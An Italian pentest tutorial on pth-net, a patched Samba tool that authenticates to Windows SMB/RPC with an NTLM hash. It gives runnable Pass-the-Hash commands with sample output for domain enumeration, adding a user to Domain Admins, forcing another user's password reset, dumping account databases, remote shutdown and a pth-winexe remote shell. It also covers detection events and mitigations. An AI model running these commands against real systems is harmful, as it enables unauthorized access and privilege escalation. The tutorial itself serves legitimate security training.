---
title: 'pth-net: guida al Pass-the-Hash con Samba su SMB/RPC'
slug: pth-net
description: 'Usa pth-net con hash NTLM per enumerare utenti, payload ,gruppi e share via SMB/RPC nei pentest, confrontalo con NetExec e Impacket e analizza la detection PtH.'
image: /pth-net-pass-the-hash-samba-net-hackita.webp
draft: false
date: 2026-07-21T00:00:00.000Z
categories:
  - tools
subcategories:
  - enum
tags:
  - pth-net
  - NTLM
  - SAMBA
  - RPC
---

# pth-net: Pass-the-Hash su SMB/RPC con s Samba net

**pth-net** è la versione modificata del comando `net` di Samba (parte del pacchetto **pth-toolkit**), capace di autenticarsi su un host Windows/SMB usando direttamente un **hash NTLM** al posto della password in chiaro. Serve per fare Pass-the-Hash contro protocolli **SMB/RPC**, enumerando utenti, gruppi, share, sessioni e informazioni di dominio senza mai conoscere la password reale.

***

## Cos'è pth-net

`net` è il tool di amministrazione di **Samba**: gestisce join di dominio, utenti, gruppi, share, RPC. Il progetto **pth-toolkit** ricompila i binari Samba più comuni — `net`, `smbclient`, `rpcclient`, `winexe` — linkandoli a una libreria che intercetta l'autenticazione NTLM e accetta un hash al posto della password.

Il risultato si chiama **pth-net**, ma il binario reale spesso resta `net` — cambia solo il meccanismo di autenticazione che accetta.

Collegamento diretto con [pass-the-hash](https://hackita.it/articoli/pass-the-hash/): pth-net è uno dei tanti *client* che implementano la tecnica, insieme a [impacket](https://hackita.it/articoli/impacket/) e [crackmapexec](https://hackita.it/articoli/crackmapexec/)/[netexec](https://hackita.it/articoli/netexec/).

## Differenza tra net e pth-net

Stesso codice, autenticazione diversa:

* `net` (originale Samba): accetta solo **username + password**. La password viene usata per calcolare l'hash NTLM al volo, internamente, prima dello scambio challenge-response.
* `pth-net`: la libreria patchata **salta il calcolo** e usa l'hash NTLM che gli passi tu direttamente nello scambio challenge-response.

Tutta la CLI, i sottocomandi, le opzioni restano identici. Cambia solo *cosa* consideri "credenziale valida".

***

## Come funziona tecnicamente

In un'autenticazione NTLM, il client **non invia mai l'hash NTLM sulla rete**, né tantomeno la password. Usa l'hash per calcolare una **risposta crittografica** a una challenge casuale inviata dal server. Sulla rete viaggiano solo: username, la challenge del server e la risposta calcolata. Per un account di dominio, il server inoltra challenge e risposta al domain controller (pass-through Netlogon), che verifica il tutto usando l'hash memorizzato per quell'account.

Questo significa una cosa fondamentale per il pentest:

> Se hai l'hash NTLM di un utente, puoi calcolare tu stesso la risposta corretta alla challenge — non ti serve mai conoscere la password in chiaro per autenticarti su SMB/RPC.

Lo stack di protocolli coinvolto, semplificato:

```text
pth-net (binario patchato)
      ↓
libsmbclient / Samba libs (patch pth-toolkit)
      ↓
NTLMSSP (scambio challenge-response con l'hash al posto della password)
      ↓
sessione SMB stabilita
      ↓
chiamate RPC incapsulate su named pipe SMB (\PIPE\srvsvc, \PIPE\samr, ecc.)
```

pth-net semplicemente ti evita il passaggio "calcola l'hash dalla password": glielo passi già pronto (magari estratto con [mimikatz](https://hackita.it/articoli/mimikatz/) o via secretsdump di [impacket](https://hackita.it/articoli/impacket/)) e lui lo usa direttamente nello scambio di autenticazione.

## Prerequisiti

Per usare pth-net con successo devono valere queste condizioni:

* il target deve **accettare autenticazione NTLM** (non deve essere in modalità Kerberos-only via policy)
* devi avere **username e hash NTLM validi** di un account su quel dominio/host
* SMB deve essere raggiungibile (**porta 445** aperta, niente firewall in mezzo)
* l'account usato deve avere **permessi sufficienti** per l'operazione RPC specifica (un utente low-priv può spesso fare `net rpc info` ma non `net rpc user`)

Se il target accetta esclusivamente Kerberos, l'autenticazione NTLM viene rifiutata a monte e pth-net non funziona: in quel caso serve un approccio diverso (Pass-the-Ticket, non trattato qui).

**Nota su account in "Protected Users":** se l'account il cui hash usi è membro del gruppo di dominio **Protected Users**, l'autenticazione NTLM per quell'account può essere bloccata per policy — un ulteriore motivo, oltre al Kerberos-only enforcement, per cui l'hash "corretto" può comunque fallire.

**Nota opsec:** passare l'hash con `-U 'DOM/user%LM:NT'` nella command line lo scrive in chiaro nella **shell history** e in `ps`/`/proc` (per una finestra di tempo, anche se Samba tenta di offuscarlo dopo l'avvio). In un contesto reale valuta variabili d'ambiente o file di credenziali con permessi ristretti invece della riga di comando diretta.

**Caveat poco documentato — `LocalAccountTokenFilterPolicy`:** per default questa chiave di registro è impostata a `0`, il che significa che **solo l'account locale RID-500 "Administrator"** (quello builtin) può sfruttare pienamente Pass-the-Hash per operazioni di amministrazione remota. Gli account di dominio con diritti di admin locale non hanno questa limitazione. Se PtH fallisce con un account locale admin diverso da "Administrator", la causa è quasi sempre questa policy, non un hash sbagliato.

***

## Installazione

Il repository originale di riferimento è **[pth-toolkit su GitHub](https://github.com/byt3bl33d3r/pth-toolkit)** — da notare: è stato **archiviato dal proprietario il 17 ottobre 2022**, quindi non riceve più aggiornamenti. Il pacchetto ancora mantenuto su Kali deriva da una serie più vecchia (`0~2015.12.37`).

Su Kali/Debian il pacchetto corretto **non** è `pth-toolkit`, ma:

```bash
sudo apt update
sudo apt install passing-the-hash
```

Verifica che sia installato correttamente:

```bash
command -v pth-net
pth-net help rpc
```

pth-net fa parte di una famiglia più ampia di binari patchati inclusi nello stesso pacchetto: **pth-rpcclient** (sessione RPC interattiva), **pth-smbclient** (browsing share), **pth-winexe** (esecuzione comandi remota), **pth-wmic**/**pth-wmis** (query e comandi via WMI). Stesso principio di autenticazione, comando diverso a seconda di cosa devi fare.

## pth-net è ancora necessario?

Non sempre. Le versioni moderne di Samba supportano nativamente l'opzione **`--pw-nt-hash`** sul comando `net` originale (non patchato): dici a `net` che il valore fornito come password è già un hash NT, senza bisogno del binario pth-net.

```bash
net rpc info -S DC01 -U 'HACKITA/hackita%edc1fb5566ecf3c345ba0ce87dff7daf' --pw-nt-hash --use-kerberos=off
```

Differenza importante nel formato: con `--pw-nt-hash` passi **solo l'hash NT**, non la coppia `LM:NT` che serve invece al vecchio pth-net. Niente placeholder LM da indovinare.

Quando ha ancora senso usare pth-net invece del `net` moderno:

* ambienti dove hai già Kali con `passing-the-hash` pronto e non vuoi installare/aggiornare pacchetti Samba
* script/documentazione legacy scritti per la sintassi `LM:NT`
* lab/CTF che assumono esplicitamente quel tool

Per tutto il resto, `net --pw-nt-hash` è la via più moderna e mantenuta.

***

## Sintassi di base

Sintassi generale, identica al `net` originale:

```bash
net rpc <sottocomando> [opzioni]
```

Con pth-net, cambia solo come costruisci `-U`:

```bash
pth-net rpc <sottocomando> -I <IP> -U '<dominio>/<utente>%<LMHASH>:<NTHASH>'
```

Punti chiave:

* Se non hai il valore LM (praticamente sempre, oggi), usa il **placeholder standard**: `aad3b435b51404eeaad3b435b51404ee`. È l'hash LM di una stringa vuota/non calcolata, va usato quando il sistema non genera più hash LM (default da Windows Vista/Server 2008 in poi).
* Il formato completo è sempre `LMHASH:NTHASH`
* `-I` specifica l'IP target (utile quando il nome NetBIOS non risolve)
* `-S <server>` è l'alternativa più usata negli esempi ufficiali: specifica il server/DC per nome invece che per IP
* `-W` specifica il dominio, alternativa a metterlo dentro `-U`

**Il placeholder LM riguarda solo il vecchio pth-net, non il `net` moderno.** Con pth-net (formato `LM:NT`) in giro trovi versioni diverse dello stesso placeholder a seconda della fonte/build che consulti — 32 zeri, il costante "empty LM hash" `aad3b435b51404eeaad3b435b51404ee`, o 32 `f`. Non è una regola universale valida per ogni build: se un placeholder fallisce con un hash NT che sai corretto, prova gli altri prima di sospettare l'hash, ma verifica sempre versione e comportamento con `pth-net help rpc` o `-d 3` per il debug. Con `net --pw-nt-hash` (visto sopra) il problema non si pone: passi solo l'hash NT, senza coppia LM:NT.

**Autenticazione su dominio:**

```bash
pth-net rpc info -I 10.10.10.50 -U 'hackita.lab/hackita%aad3b435b51404eeaad3b435b51404ee:edc1fb5566ecf3c345ba0ce87dff7daf'
```

**Autenticazione locale (account di macchina, non di dominio)** — usa il nome dell'host al posto del dominio:

```bash
pth-net rpc info -I 10.10.10.50 -U 'WORKSTATION01/Administrator%aad3b435b51404eeaad3b435b51404ee:edc1fb5566ecf3c345ba0ce87dff7daf'
```

**IP vs hostname:** usa `-I <IP>` quando il nome NetBIOS/DNS non risolve dalla tua macchina (caso comune in lab/CTF senza DNS configurato). Usa l'hostname diretto quando hai già la risoluzione DNS/hosts funzionante — con Kerberos abilitato sul target l'hostname è spesso necessario, ma pth-net lavora in puro NTLM quindi l'IP va sempre bene.

***

## I comandi `net rpc` più utili in un assessment

`pth-net` eredita **tutti** i sottocomandi di `net rpc` di Samba. Una cosa da sapere prima di tutto: **molti sottocomandi non stampano nulla quando vanno a buon fine** — se non vedi errori `NT_STATUS_*`, ha funzionato. Di seguito quelli che contano davvero in un pentest AD, ognuno con un esempio e un output plausibile (il formato esatto può variare leggermente a seconda della versione di Samba installata).

### net rpc info — verifica che l'hash funzioni

```bash
pth-net rpc info -I 10.10.10.50 -U 'hackita.lab/hackita%:edc1fb5566ecf3c345ba0ce87dff7daf'
```

```text
Domain Name: HACKITA
Domain SID: S-1-5-21-3623811015-3361044348-30300820
```

### net rpc user — enumera utenti

```bash
pth-net rpc user -I 10.10.10.50 -U 'hackita.lab/hackita%:edc1fb5566ecf3c345ba0ce87dff7daf'
```

```text
Administrator
Guest
krbtgt
hackita
jsmith
svc_backup
```

### net rpc group — enumera gruppi

```bash
pth-net rpc group -I 10.10.10.50 -U 'hackita.lab/hackita%:edc1fb5566ecf3c345ba0ce87dff7daf'
```

```text
Domain Admins
Domain Users
Domain Computers
Enterprise Admins
IT Support
```

### net rpc group members "\<gruppo>" — chi è dentro un gruppo

```bash
pth-net rpc group members "Domain Admins" -I 10.10.10.50 -U 'hackita.lab/hackita%:edc1fb5566ecf3c345ba0ce87dff7daf'
```

```text
HACKITA\Administrator
HACKITA\svc_backup
```

### net rpc share — share SMB esposte

```bash
pth-net rpc share -I 10.10.10.50 -U 'hackita.lab/hackita%:edc1fb5566ecf3c345ba0ce87dff7daf'
```

```text
Sharename      Type      Comment
---------      ----      -------
ADMIN$         Disk      Remote Admin
C$             Disk      Default share
IPC$           IPC       Remote IPC
NETLOGON       Disk      Logon server share
SYSVOL         Disk      Logon server share
Backups        Disk      Backup share
```

A cosa serve: ti dice dove puoi entrare a curiosare. Share non standard come `Backups` sono spesso una miniera — script con password hardcoded, backup di configurazioni, file .xml/.config con credenziali. Da qui passi naturalmente a [smbclient](https://hackita.it/articoli/smbclient/) per navigarci dentro.

### net rpc file — file aperti in quel momento

```bash
pth-net rpc file -I 10.10.10.50 -U 'hackita.lab/hackita%:edc1fb5566ecf3c345ba0ce87dff7daf'
```

```text
ID       Path                    User            Locks
------   ------------------      ------------    -----
1054     \Backups\report.xlsx    hackita         0
```

A cosa serve: ti dice chi sta usando cosa in questo momento. Utile per capire se un utente è loggato/attivo (indicatore di sessione live da poter dirottare) o se un file è lockato da un processo — piccolo dettaglio ma utile in fase di ricognizione prima di toccare qualcosa.

### net rpc password — cambio password (proprio account)

```bash
pth-net rpc password hackita NuovaPassword123! -U 'hackita.lab/hackita%:edc1fb5566ecf3c345ba0ce87dff7daf' -S DC01
```

Nessun output in caso di successo — se l'hash o i permessi sono sbagliati compare `NT_STATUS_WRONG_PASSWORD` o `NT_STATUS_ACCESS_DENIED`.

### net rpc shell — shell RPC interattiva

```bash
pth-net rpc shell -I 10.10.10.50 -U 'hackita.lab/hackita%:edc1fb5566ecf3c345ba0ce87dff7daf'
```

```text
net rpc> user
Administrator
Guest
hackita
net rpc> exit
```

Dentro la shell puoi lanciare i sottocomandi (`user`, `group`, `share`...) senza ripetere ogni volta `-U`/`-I`.

### net rpc service — gestione servizi remoti

```bash
pth-net rpc service list -I 10.10.10.50 -U 'hackita.lab/hackita%:edc1fb5566ecf3c345ba0ce87dff7daf'
```

```text
Spooler             Print Spooler
BITS                 Background Intelligent Transfer Service
Schedule             Task Scheduler
```

A cosa serve: ti dice quali servizi girano sul target e, se hai i permessi, ti permette di avviarli/fermarli da remoto (`net rpc service start/stop <nome>`). In un assessment ti fa capire se puoi abusare di un servizio vulnerabile o mal configurato senza dover aprire una shell.

### net rpc registry — lettura hive di registro remote

```bash
pth-net rpc registry enumerate 'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion' -I 10.10.10.50 -U 'hackita.lab/hackita%:edc1fb5566ecf3c345ba0ce87dff7daf'
```

```text
KeyName
--------
CurrentVersion
ProductName: Windows Server 2019 Standard
```

A cosa serve: leggere (o scrivere, con permessi sufficienti) chiavi di registro da remoto senza toccare il filesystem. Utile per raccogliere info di sistema (versione OS, software installato, configurazioni) o piazzare valori persistenti in fase di post-exploitation.

### net rpc getsid — recupera il SID nel secrets.tdb locale

```bash
pth-net rpc getsid -I 10.10.10.50 -U 'hackita.lab/hackita%:edc1fb5566ecf3c345ba0ce87dff7daf'
```

```text
Storing SID S-1-5-21-3623811015-3361044348-30300820 for Domain HACKITA in secrets.tdb
```

A cosa serve: prende il SID di dominio e lo salva **localmente sulla tua macchina attaccante** (nel `secrets.tdb` di Samba), non sul target. Serve quando devi far finta che la tua macchina Linux sia "joinata" al dominio per usare altri strumenti Samba che si aspettano quel SID già configurato in locale — un caso più raro, utile soprattutto se pianifichi operazioni ADS successive con lo stesso host.

### net rpc rights list — privilegi assegnati

```bash
pth-net rpc rights list -I 10.10.10.50 -U 'hackita.lab/hackita%:edc1fb5566ecf3c345ba0ce87dff7daf'
```

```text
SeNetworkLogonRight
SeInteractiveLogonRight
SeBackupPrivilege
SeRestorePrivilege
```

A cosa serve: mostra quali privilegi di sistema (non permessi su file, proprio i diritti Windows tipo `SeBackupPrivilege`) sono assegnati a un utente/gruppo. Se trovi un account con `SeBackupPrivilege`/`SeRestorePrivilege` assegnato, hai già in mano una strada diretta per leggere/scrivere qualsiasi file sul sistema — inclusi hive di registro con credenziali.

### net rpc trustdom list — trust tra domini

```bash
pth-net rpc trustdom list -I 10.10.10.50 -U 'hackita.lab/hackita%:edc1fb5566ecf3c345ba0ce87dff7daf'
```

```text
No trusted domains
```

A cosa serve: ti dice se il dominio ha relazioni di **trust** con altri domini/foreste. Se ci sono trust configurati, qui vedi il nome del dominio trustato — utile per capire se puoi muoverti lateralmente verso un'altra foresta/dominio partendo dallo stesso hash o da credenziali derivate.

### net rpc printer — stampanti condivise

```bash
pth-net rpc printer list -I 10.10.10.50 -U 'hackita.lab/hackita%:edc1fb5566ecf3c345ba0ce87dff7daf'
```

```text
printername:    HP-Laser-01
description:    HP LaserJet 400 M401 - Piano 2
```

A cosa serve: enumera le stampanti condivise sul target. Sembra poco rilevante, ma le code di stampa Windows sono un vettore noto per privilege escalation (spooler exploit, tipo PrintNightmare) — sapere cosa gira qui ti dice se vale la pena approfondire quella strada.

### net rpc vampire — sync di un PDC NT legacy

```bash
pth-net rpc vampire -I 10.10.10.50 -U 'hackita.lab/hackita%:edc1fb5566ecf3c345ba0ce87dff7daf'
```

```text
Vampired 128 accounts.
```

A cosa serve: copia in blocco **tutto il database account** di un vecchio PDC NT4 (utenti, hash inclusi) dentro il tuo `passdb` locale, in un colpo solo. Comando ormai raro (ambienti NT4/PDC legacy), ma se lo trovi funzionante è oro: è un dump massivo di credenziali con un solo comando, può ancora saltar fuori in lab storici o su sistemi non aggiornati.

### net rpc shutdown — shutdown remoto

```bash
pth-net rpc shutdown -r -t 30 -C "Manutenzione programmata" -I 10.10.10.50 -U 'hackita.lab/hackita%:edc1fb5566ecf3c345ba0ce87dff7daf'
```

`-r` = riavvio invece di spegnimento, `-t` = secondi di countdown, `-C` = messaggio mostrato agli utenti. Nessun output in caso di successo.

A cosa serve: spegnere/riavviare un host da remoto senza shell. Attenzione: è un comando **distruttivo/rumoroso** — in un assessment autorizzato va usato solo se concordato con il cliente, mai "per provare".

## Comandi operativi (non solo enumerazione)

pth-net non serve solo a leggere: può anche **modificare** oggetti AD, se l'account ha i privilegi giusti. Il caso più citato in letteratura è aggiungere un utente a un gruppo privilegiato:

```bash
pth-net rpc group addmem "Domain Admins" hackita -U 'hackita.lab/admin%:edc1fb5566ecf3c345ba0ce87dff7daf' -S DC01
```

Nessun output in caso di successo (verifica con `net rpc group members "Domain Admins"` subito dopo per confermare). In caso di permessi insufficienti: `NT_STATUS_ACCESS_DENIED`.

Aggiunge l'utente `hackita` al gruppo `Domain Admins`. Serve un account con diritti di scrittura su quel gruppo (es. compromesso via [ForceChangePassword](https://hackita.it/articoli/active-directory/) o già Domain Admin). Stesso principio funziona per rimuovere un membro (`delmem` al posto di `addmem`).

**Reset password di un altro utente** (abuso di `ForceChangePassword`/`GenericAll` su un account target):

```bash
pth-net rpc password vittima NuovaPassword123! -U 'hackita.lab/attaccante%:edc1fb5566ecf3c345ba0ce87dff7daf' -S DC01
```

Anche qui: nessun output = successo. Nota bene: questo è diverso dal cambiare la *propria* password. Qui passi come primo argomento l'**utente bersaglio** di cui vuoi forzare la password — funziona solo se il tuo account ha i permessi ACL necessari su quell'oggetto.

Questo è anche il motivo per cui pth-net non va sottovalutato in fase di post-exploitation: non è solo un tool di ricognizione, è un tool di **persistenza e privilege escalation** a tutti gli effetti.

## Un tool fratello per l'esecuzione: pth-winexe

pth-net enumera e modifica oggetti AD via RPC, ma **non esegue comandi arbitrari** sul target. Per quello, nella stessa famiglia di pth-toolkit c'è `pth-winexe`, che apre una shell remota con lo stesso principio di autenticazione:

```bash
pth-winexe -U 'hackita.lab/hackita%:edc1fb5566ecf3c345ba0ce87dff7daf' //10.10.10.50 cmd.exe
```

```text
HackWait cmd.exe started, waiting for the remote end to reply...
Microsoft Windows [Version 10.0.17763.1]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

Se il tuo obiettivo non è enumerare ma **eseguire codice**, pth-winexe (o meglio ancora `wmiexec.py`/`psexec.py` di [impacket](https://hackita.it/articoli/impacket/), più moderni e mantenuti) è lo strumento giusto, non pth-net.

## Flusso operativo tipico

```text
Hash NTLM ottenuto (mimikatz / secretsdump / dump NTDS)
      ↓
net rpc info        → conferma che l'hash funziona + SID di dominio
      ↓
net rpc user        → enumera utenti
      ↓
net rpc group       → enumera gruppi, cerca Domain Admins / gruppi privilegiati
      ↓
net rpc share       → enumera share raggiungibili
      ↓
net rpc service     → se hai privilegi, verifica servizi controllabili
```

## Quando NON usare pth-net

* **Devi fare spraying dell'hash su decine/centinaia di host** → usa [netexec](https://hackita.it/articoli/netexec/), pensato per il multi-target
* **Ti serve una shell interattiva completa** → [evilwinrm](https://hackita.it/articoli/evilwinrm/) (se WinRM è aperto) o [wmiexec](https://hackita.it/articoli/wmiexec/)/[psexec](https://hackita.it/articoli/psexec/) via [impacket](https://hackita.it/articoli/impacket/)
* **Hai già la password in chiaro** → usa [rpcclient](https://hackita.it/articoli/rpcclient/) o `net` originale, non serve pth
* **Il target è Kerberos-only** → NTLM è rifiutato a monte, serve un approccio via ticket
* **Devi fare relay, non solo autenticazione diretta** → guarda ntlmrelayx di [impacket](https://hackita.it/articoli/impacket/)

***

## Esempio di output reale

Output tipico di `net rpc info` quando l'hash è corretto:

```text
Domain Name: HACKITA
Domain SID: S-1-5-21-3623811015-3361044348-30300820
```

Cosa significa riga per riga:

* **Domain Name**: nome NetBIOS del dominio, ti conferma che l'autenticazione è andata a buon fine
* **Domain SID**: identificatore univoco del dominio. Utile per costruire manualmente SID di utenti/gruppi noti (es. `S-1-5-21-...-512` = Domain Admins) quando non hai [bloodhound](https://hackita.it/articoli/bloodhound/) o altri tool di mappatura a disposizione

***

## Confronto con altri tool Pass-the-Hash

| Strumento                                              | Protocollo         | Punto di forza                                     | Limite                                      |
| ------------------------------------------------------ | ------------------ | -------------------------------------------------- | ------------------------------------------- |
| **pth-net**                                            | SMB/RPC            | Enumerazione RPC nativa, comandi Samba completi    | Sintassi datata, meno mantenuto             |
| **NetExec** (ex CrackMapExec)                          | SMB/WinRM/LDAP/RDP | Multi-protocollo, spraying su range interi, moduli | Meno controllo fine sui singoli comandi RPC |
| **Impacket** (`psexec.py`, `wmiexec.py`, `smbexec.py`) | SMB/DCOM/WMI       | Execution + shell, scriptabile in Python           | Serve uno script diverso per ogni tecnica   |
| **evil-winrm**                                         | WinRM              | Shell PowerShell diretta                           | Richiede WinRM abilitato (porta 5985)       |

## net.exe è un'alternativa a pth-net?

No, e va chiarito perché si presta a confusione. `net.exe`/`net use` nativi di Windows accettano password, smart card o credenziali già presenti nella sessione/Credential Manager — **non hanno un'opzione per passare direttamente un hash NT**. Non sono quindi un client Pass-the-Hash autonomo.

`net.exe` diventa utile in ottica PtH solo *dopo* che l'hash è già stato "iniettato" in una sessione di logon tramite un altro strumento (es. `sekurlsa::pth` di mimikatz, che crea un processo con quel token): a quel punto, dentro quel processo, `net.exe` eredita implicitamente quelle credenziali per operazioni di amministrazione native — ma il passaggio dell'hash lo fa mimikatz, non `net.exe`.

pth-net invece è pensato per l'attacco **da Linux verso Windows**, dove non hai nessuna sessione preesistente sul target: gli passi l'hash direttamente nel comando e lui gestisce tutto lo scambio di autenticazione.

***

## Errori comuni

* **NT\_STATUS\_LOGON\_FAILURE**: hash sbagliato, oppure utente/dominio scritto male. Controlla maiuscole nel dominio NetBIOS.
* **NT\_STATUS\_ACCESS\_DENIED**: autenticazione riuscita ma l'operazione richiesta richiede privilegi che l'account non ha.
* **NT\_STATUS\_ACCOUNT\_LOCKED\_OUT**: l'account è bloccato per troppi tentativi falliti — comune se hai sbagliato hash più volte in ambienti con lockout policy attiva.
* **NT\_STATUS\_ACCOUNT\_DISABLED**: l'account esiste ma è disabilitato lato dominio.
* **NT\_STATUS\_NO\_LOGON\_SERVERS**: nessun DC raggiungibile per validare il logon di dominio — controlla DNS/routing verso il DC.
* **Connection reset / timeout**: firewall che blocca la 445, oppure protocollo SMB troppo vecchio/nuovo non negoziabile tra client e server. **Non è lo SMB signing a bloccare pth-net**: signing protegge da manomissione/relay, non impedisce a un client con hash valido di autenticarsi direttamente.
* **Funziona `net rpc info` ma non `net rpc user`**: l'utente non ha privilegi di enumerazione, comune con account a basso privilegio — normale, non è un errore di sintassi.
* **Dimenticare i due punti prima dell'NT hash**: il formato è sempre `LM:NT`, anche con LM a zero.
* Se invece vedi errori Kerberos (es. `KDC_ERR_PREAUTH_FAILED`), non stai più parlando con pth-net/NTLM: sei finito su un flusso Kerberos (porta 88), tool o approccio sbagliato per questo scenario.

***

## Detection lato Blue Team

Pass-the-Hash via RPC/SMB lascia tracce specifiche:

* **Event ID 4624** (Logon Type 3) con nome dominio/utente ma **senza** un evento 4648 corrispondente di "explicit credentials" — pattern tipico di PtH
* **Event ID 4776** sul domain controller: validazione NTLM dell'account, utile per correlare da dove arriva l'autenticazione
* **Event ID 4672** se l'account ha privilegi elevati
* **Event ID 5140/5145** per accesso ed enumerazione delle share (utile quando pth-net enumera `net rpc share`/`net rpc file`)
* **Event ID 4724** per reset password remoto (rilevante per `net rpc password` su un altro utente)
* **Event ID 4728/4732/4756** per aggiunta membri a gruppi globali/locali/universali (rilevante per `net rpc group addmem`)
* Traffico RPC verso porte 135/445 da un singolo host verso molti target in sequenza ravvicinata (indicatore di enumerazione/spraying)

Un singolo evento isolato non basta a identificare un Pass-the-Hash: va **correlato** con tipo di logon, protocollo di autenticazione, workstation di origine e azioni successive. MITRE ATT\&CK classifica questa tecnica come **T1550.002 – Use Alternate Authentication Material**.

> **Box: Pass-the-Hash ≠ NTLM relay.** Sono due tecniche diverse. Lo SMB signing contrasta soprattutto manomissione e **relay** (dove un attaccante inoltra una sessione di autenticazione altrui), ma non impedisce a un client che possiede già un hash valido di autenticarsi direttamente — quello è il caso di pth-net. Non trattarlo come mitigazione universale al PtH.

**Mitigazioni più efficaci contro il PtH stesso:**

* restrizione/blocco di NTLM dove possibile (via GPO)
* **Windows LAPS** per evitare che l'hash dell'account Administrator locale sia identico su più host (il vero moltiplicatore di impatto del PtH)
* **Remote UAC filtering** per limitare gli account locali all'amministrazione remota
* **Credential Guard** per ostacolare l'estrazione dell'hash da LSASS
* **Protected Users** per bloccare NTLM sugli account privilegiati compatibili
* segmentazione di rete: porta 445 raggiungibile solo da reti/jump host amministrativi
* tiering degli account amministrativi (Tier 0/1/2)

Per approfondire la difesa vedi anche [windows-privilege-escalation](https://hackita.it/articoli/windows-privilege-escalation/) e [active-directory](https://hackita.it/articoli/active-directory/).

***

## FAQ

**pth-net funziona anche con NTLMv2?**
Sì, l'autenticazione NTLM (v1/v2) è quella intercettata dalla libreria pth-toolkit: l'hash NT che fornisci è indipendente dalla versione del protocollo di challenge-response.

**Serve avere il nome utente esatto o basta il SID?**
Serve il nome utente (o il RID se stai bypassando la risoluzione nome→SID), il SID da solo non è sufficiente per l'header di autenticazione NTLM.

**pth-net funziona su share SMB con Kerberos-only enforcement?**
No: se il target accetta solo Kerberos e ha disabilitato NTLM come meccanismo di autenticazione, Pass-the-Hash via NTLM (quindi anche pth-net) non funziona — serve un approccio diverso (Pass-the-Ticket, con [kerberos](https://hackita.it/articoli/kerberos/)).

**È legale usare pth-net?**
Sì, in laboratori autorizzati, CTF, piattaforme come Hack The Box o in un pentest con autorizzazione scritta. Fuori da questi contesti è accesso abusivo a sistema informatico.

***

## Cheatsheet comandi più usati

| Obiettivo                      | Comando                                                                          |
| ------------------------------ | -------------------------------------------------------------------------------- |
| Verificare che l'hash funzioni | `pth-net rpc info -I <IP> -U 'DOM/user%:HASH'`                                   |
| Enumerare utenti               | `pth-net rpc user -I <IP> -U 'DOM/user%:HASH'`                                   |
| Enumerare gruppi               | `pth-net rpc group -I <IP> -U 'DOM/user%:HASH'`                                  |
| Membri di un gruppo            | `pth-net rpc group members "Domain Admins" -I <IP> -U 'DOM/user%:HASH'`          |
| Enumerare share                | `pth-net rpc share -I <IP> -U 'DOM/user%:HASH'`                                  |
| File aperti sulle share        | `pth-net rpc file -I <IP> -U 'DOM/user%:HASH'`                                   |
| Aprire shell RPC               | `pth-net rpc shell -I <IP> -U 'DOM/user%:HASH'`                                  |
| Aggiungere utente a un gruppo  | `pth-net rpc group addmem "Domain Admins" <utente> -U 'DOM/admin%:HASH' -S <DC>` |

***

## Conclusione

`pth-net` è uno strumento "vecchia scuola" ma ancora estremamente utile quando serve enumerazione RPC precisa con un hash NTLM, senza il sovraccarico di tool più moderni. Conoscerlo bene ti dà anche una comprensione più profonda di *come* funziona Pass-the-Hash sotto al cofano — cosa che NetExec o Impacket ti nascondono dietro un'interfaccia comoda.

Per continuare lo studio: [pass-the-hash](https://hackita.it/articoli/pass-the-hash/), [impacket](https://hackita.it/articoli/impacket/), [netexec](https://hackita.it/articoli/netexec/), [crackmapexec](https://hackita.it/articoli/crackmapexec/), [rpcclient](https://hackita.it/articoli/rpcclient/), [smb](https://hackita.it/articoli/smb/), [bloodhound](https://hackita.it/articoli/bloodhound/), [responder](https://hackita.it/articoli/responder/).
